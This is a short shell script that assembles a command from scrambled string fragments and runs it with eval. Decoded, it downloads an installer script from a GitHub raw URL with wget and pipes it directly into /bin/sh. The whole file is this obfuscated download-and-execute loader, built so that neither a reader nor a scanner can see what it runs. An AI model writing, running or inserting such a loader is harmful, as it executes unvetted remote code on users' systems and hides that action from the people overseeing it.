z="
";Jz='om/e';Fz='hubu';Mz='uran';Uz='bin/';Bz=' htt';Rz='sh -';Pz='stal';Qz='ler.';Vz='sh';Ez='.git';Dz='/raw';Tz=' | /';Az='wget';Gz='serc';Kz='mil2';Iz='nt.c';Sz='qO -';Nz='/mai';Oz='n/in';Hz='onte';Lz='37/q';Cz='ps:/';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"